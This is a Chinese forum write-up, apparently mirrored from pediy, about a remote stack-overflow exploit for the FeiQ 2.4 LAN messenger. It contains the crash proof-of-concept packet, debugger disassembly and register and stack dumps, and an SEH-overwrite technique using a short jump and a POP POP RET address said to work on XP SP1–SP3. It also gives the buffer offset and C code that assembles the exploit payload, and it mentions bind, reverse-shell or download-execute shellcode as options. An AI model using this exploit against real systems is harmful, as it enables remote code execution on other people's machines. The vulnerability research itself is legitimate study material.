
# artake 飞秋远程可利用 0day 的详细分析和利用方法

> 原文：[`www.pediy.com/kssd/pediy12/144012.html`](https://www.pediy.com/kssd/pediy12/144012.html)

artake 大大在《 飞秋远程可利用 0day》中已经对该 BUG 进行了详细的描述。
飞秋是个不错的局域网通信软件，相信使用的用户不少，最新版本应该是 2.5。考虑到可能对很多使用者造成隐患，这边就拿低一点的版本进行分析，为 2.4 版本。
其实 artake 已经说得很清楚了，很多大大可能不屑于这么简单的栈溢出，我这边权且当做抛砖引玉吧，见笑了。

## 一、

根据 artake 提供的 POC：

`1_lbt4_1#65664#6CF04987CC1A#570#31741#4294967295#2.5a:1317316152:admin:XXCCLI-A10D5C26:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.......`

调试定位到出现 bug 时的代码：

```
0049061C  |.  /EB 2E         jmp     short 0049064C
0049061E  |>  |81FB FF3F0000 cmp     ebx, 3FFF
00490624  |.  |B8 FF3F0000   mov     eax, 3FFF
00490629  |.  |7F 02         jg      short 0049062D
0049062B  |.  |8BC3          mov     eax, ebx
0049062D  |>  |8B7424 20     mov     esi, dword ptr [esp+20]
00490631  |.  |8BC8          mov     ecx, eax
00490633  |.  |8BD9          mov     ebx, ecx
00490635  |.  |C1E9 02       shr     ecx, 2
00490638  |.  |F3:A5         rep     movs dword ptr es:[edi], dword p>;  //在拷贝时溢出出错
0049063A  |.  |8BCB          mov     ecx, ebx
0049063C  |.  |8B5C24 2C     mov     ebx, dword ptr [esp+2C]
00490640  |.  |83E1 03       and     ecx, 3
00490643  |.  |40            inc     eax
```

在执行到 `00490638` 时，寄存器状态如下：

`EAX` `FFFFFFFF`

`ECX` `3FFFFFFF`

`EDX` `00000000`

`EBX` `FFFFFFFF`

`ESP` `0011B450`

`EBP` `001235C8` ASCII `"admin"`

`ESI` `0011F525`

`EDI` `00123670`

`EIP` `00490638` 飞秋 FeiQ.`00490638`

可知从 `ESI` 地址拷贝 `3FFFFFFF` byte 数据到`[00123670]`,拷贝时数据从低位往高位增长，即堆栈往下增长，堆栈栈底信息如下：

`0012FFEC`   `00000000`

`0012FFF0`   `00000000`

`0012FFF4`   `00000000`

`0012FFF8`   `00552DC7`  飞秋 FeiQ.`<ModuleEntryPoint>`

`0012FFFC`   `00000000`

`00123670` + `3FFFFFFF`>`0012FFFC`  ,明显溢出。

## 二、

溢出时，触发 SEH,此时再观察堆栈中的 SEH，查看 SEH 链：

SEH 链用于  主线程

地址       SE 处理程序

`0011F498`   飞秋 FeiQ.`00589B89`

`0012D5F4`   飞秋 FeiQ.`00593AA7`

`0012D678`   飞秋 FeiQ.`00595644`

`0012D728`   USER32.`77D4048F`

`0012D788`   USER32.`77D4048F`

`0012D80C`   飞秋 FeiQ.`005955B4`

`0012FF08`   飞秋 FeiQ.`00586673`

`0012FFB0`   飞秋 FeiQ.`00555990`

`0012FFE0`   kernel32.`7C839AD8`

堆栈值>`123670`（拷贝的第一个 EDI 地址）的第一个 SEH 链为 `0012D5F4`，进去看具体堆栈：

`0012D5F0`   `0050F55F`  返回到 飞秋 FeiQ.`0050F55F` 来自 飞秋 FeiQ.`00550870`

`0012D5F4`   `0012D678`  指向下一个 SEH 记录的指针

`0012D5F8`   `00593AA7`  SE 处理程序

`0012D5FC`   `FFFFFFFF`

初步构思淹没 SEH 指针和处理程序，从而能执行到自己的 shellcode，构思结果如下：

`0012D5F4`   `06EB06EB`  指向下一个 SEH 记录的指针,这里更改为相当于 jmp +4，跳到 `0012D5FC` 执行 shellcode

`0012D5F8`   `7FFA1571`  SE 处理程序，这个地址是经典的 POP，POP,RET 地址，XP SP1，SP2，SP3 应该是通用

`0012D5FC`   `0089E8FC`  这里为 shellcode 开始地址

`0012D600`   `89600000`

`0012D604`   `64D231E5`

`0012D608`   `8B30528B`

`0012D60C`   `528B0C52`

## 三、

初步分析后，考虑如何实现以上淹没过程，首先需计算偏移，使其能正确淹没 SEH 地址。在这个例子中，计算偏移的方法比较简单，可直接利用 artake 提供的 POC 程序定位：

当数据刚好淹没到 `0012D5F8` 时，此时 `ESI` 数据位：`1294A9`，而数据开始地址为 `1277BB`，则 `1294A9` - `1277BB` = `1CEE`。

也就是说数据偏移 `0X1CEE` 处即应为数据 `06EB06EB`（jmp +4）。

在 artake 大大的代码下，简略更改如下：

```c
char senddata1[] = "1_lbt4_1#65664#6CF04987CC1A#570#31741#4294967295#2.5a:1317316152:admin:XXCCLI-A10D5C26:0:";
char befor_shellcode[] ="\xeb\x06\xeb\x06\x71\x15\xfa\x7f";  //8 byte  
int i=0;
int senddata1length = strlen(senddata1);
memset(sendbuf,'A',0x3fff);
strcpy(sendbuf,senddata1);
strcpy(sendbuf+senddata1length+0x1cee,befor_shellcode);
strcpy(sendbuf+senddata1length+strlen(befor_shellcode) + 0x1cee,shellcode);
```

上面的 `shellcode` 就不列出来了，是绑定端口或反弹端口或下载执行，仁者见仁，智者见智吧，如果 `shellcode` 里面有 byte 为 `0x00`,那么可用 encode 方式或直接用 for 循环拷贝到 `sendbuf` 即可。

执行效果如下：

![](img/5c914c2e682485ba4eae355b93eca0e0.jpg)

在 winxp 下通用。
